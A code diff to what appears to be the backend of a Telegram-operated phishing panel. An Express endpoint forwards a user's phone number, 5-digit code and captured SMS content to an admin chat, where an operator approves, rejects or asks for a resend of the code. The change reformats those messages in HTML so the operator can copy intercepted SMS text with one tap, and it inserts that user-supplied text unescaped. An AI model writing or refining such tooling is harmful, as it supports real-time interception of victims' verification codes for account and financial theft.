@@ -56,20 +56,23 @@ if (token) {
             session.nextStep = 'verification';
             await bot.editMessageText(`${originalText}\n\n✅ STATUS: APPROVED`, {
                 chat_id: chatId,
-                message_id: messageId
+                message_id: messageId,
+                parse_mode: 'HTML'
             });
         } else if (decision === 'smsreject') {
             session.status = 'sms_rejected';
             session.nextStep = 'rejected';
             await bot.editMessageText(`${originalText}\n\n❌ STATUS: REJECTED\n(To set the correct code, use: /setcode ${sessionId} <5-digit-code>)`, {
                 chat_id: chatId,
-                message_id: messageId
+                message_id: messageId,
+                parse_mode: 'HTML'
             });
         } else if (decision === 'smsresend') {
             session.nextStep = 'resend_sms';
             await bot.editMessageText(`${originalText}\n\n🔄 STATUS: RESEND REQUESTED`, {
                 chat_id: chatId,
-                message_id: messageId
+                message_id: messageId,
+                parse_mode: 'HTML'
             });
         }
 
@@ -194,14 +197,16 @@ app.post('/api/submit-sms', (req, res) => {
 
     session.sms = sms;
 
+    // Added <pre> and <code> tags around the SMS content so you can copy ONLY the SMS text easily
     bot.sendMessage(adminChatId,
-        `📩 *SMS Received from User*\n\n` +
+        `📩 <b>SMS Received from User</b>\n\n` +
         `📱 Phone: ${session.phone}\n` +
         `🔑 5-Digit Code: ${session.fiveDigitCode}\n\n` +
-        `*SMS Content:*\n\`\`\`\n${sms}\n\`\`\`\n\n` +
+        `*SMS Content:* (Tap the box below to copy just the text)\n` +
+        `<pre><code>${sms}</code></pre>\n\n` +
         `Choose an action below.`,
         {
-            parse_mode: 'Markdown',
+            parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [[
                     { text: '✅ Approve', callback_data: `smsapprove_${sessionId}` },
